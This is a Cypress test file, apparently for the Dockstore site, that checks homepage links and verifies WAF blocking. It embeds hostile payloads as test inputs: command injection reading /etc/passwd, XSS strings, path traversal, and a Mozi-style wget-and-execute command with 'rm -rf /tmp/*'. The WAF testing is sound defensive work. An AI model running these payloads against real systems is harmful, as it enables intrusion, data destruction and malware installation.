import { goToTab } from '../../support/commands';

function checkLink(selector: string, url: string): void {
  it('these links should be present', () => {
    cy.visit('');
    cy.get(selector).click();
    cy.url().should('include', url);
  });
}

function checkExternalLink(selector: string, url: string): void {
  it('Check External links', () => {
    cy.visit('');
    cy.get(selector).should('have.attr', 'href').and('include', url);
  });
  return;
}

const selectorLinkTuples = [
  ['[data-cy=register-button]', '/login'],
  ['[data-cy=homepage-organizations-button]', '/organizations'],
  ['[data-cy=homepage-search-link]', '/search'],
];

const externalLinkTuples = [
  ['[data-cy=homepage-discuss-link]', 'discuss.dockstore.org'],
  ['[data-cy=footer-api-link]', '/static/swagger-ui/index.html'],
  ['[data-cy=footer-about-link]', '/dockstore-introduction.html'],
];

before(() => {
  cy.visit('');
});

describe('Monitor homepage links', () => {
  describe('Check links', () => {
    selectorLinkTuples.forEach((t) => checkLink(t[0], t[1]));
  });
  describe('Monitor external homepage links', () => {
    externalLinkTuples.forEach((t) => checkExternalLink(t[0], t[1]));
  });

  describe('Test RSS feed', () => {
    it('access RSS feed', () => {
      cy.get('[data-cy=footer-rss-link]').then((t) => {
        cy.request(t.prop('href')).its('body').should('include', '<rss version="2.0">');
      });
    });
  });
});

describe('Test WAF behavior', () => {
  // There are WAF rules we don't want turned on
  it('Try a URL that would break if RestrictedExtensions_URIPATH were turned on', () => {
    const longUrl =
      '/api/ga4gh/trs/v2/tools/%23workflow%2Fgithub.com%2Fnf-core%2Fhlatyping/versions/1.1.2/plain-NFL/descriptor//nextflow.config';
    cy.request(longUrl).its('body').should('include', 'nfcore/hlatyping:1.1.2');
  });
  it('Try a URL that will break if GenericLFI_URIPATH were turned on', () => {
    const uglyUrl =
      '/api/api/ga4gh/v2/tools/%23workflow%2Fgithub.com%2FNCI-GDC%2Fgdc-dnaseq-cwl%2FGDC_DNASeq/versions/master/CWL/descriptor/..%2F..%2Ftools%2Fbam_readgroup_to_json.cwl';
    cy.request(uglyUrl).its('body').should('have.property', 'content');
  });
  // And ones we do want turned on
  it('Try a header that SHOULD be blocked by UserAgent_BadBots_HEADER', () => {
    const baseUrl = '/organizations';
    cy.request(baseUrl, { headers: { name: 'User-Agent', value: 'Mozilla/5.0 zgrab/0.x' } }).then((resp) => {
      expect(resp.status).to.eq(403); // The actual return code is TBD
    });
  });
  it('Try a URL that SHOULD be blocked if EC2MetaDataSSRF_URIPATH were turned on', () => {
    const uglyUrl = '/PARAM=127.0.0.1+-c+0%3B+cat+%2Fetc%2Fpasswd&DIAGNOSIS=PING';
    cy.request(uglyUrl).then((resp) => {
      expect(resp.status).to.eq(403); // The actual return code is TBD
    });
  });
  it('Try a query arguments that SHOULD be blocked if CrossSiteScripting_QUERYARGUMENTS were turned on', () => {
    const uglyUrl = '/api/static/swagger-ui/index.html';
    cy.request(uglyUrl, { qs: { url: '%22%3Cscript%3E{{{alert(%27hi%27)}}}%22' } }).then((resp) => {
      expect(resp.status).to.eq(403); // The actual return code is TBD
    });
  });
  it('Try a URI that SHOULD be blocked if CrossSiteScripting_URIPATH were turned on', () => {
    const uglyUrl = '/gitlab/build_now%3Csvg/onload=alert(1337)%3E';
    cy.request(uglyUrl).then((resp) => {
      expect(resp.status).to.eq(403); // The actual return code is TBD
    });
  });
  it('Try arguments that SHOULD be blocked if RestrictedExtensions_QUERYARGUMENTS were turned on', () => {
    const uglyUrl = '/gitlab/build_now%3Csvg/onload=alert(1337)%3E';
    cy.request(uglyUrl, {
      qs: {
        next_file:
          'netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1',
      },
    }).then((resp) => {
      expect(resp.status).to.eq(403); // The actual return code is TBD
    });
  });
});
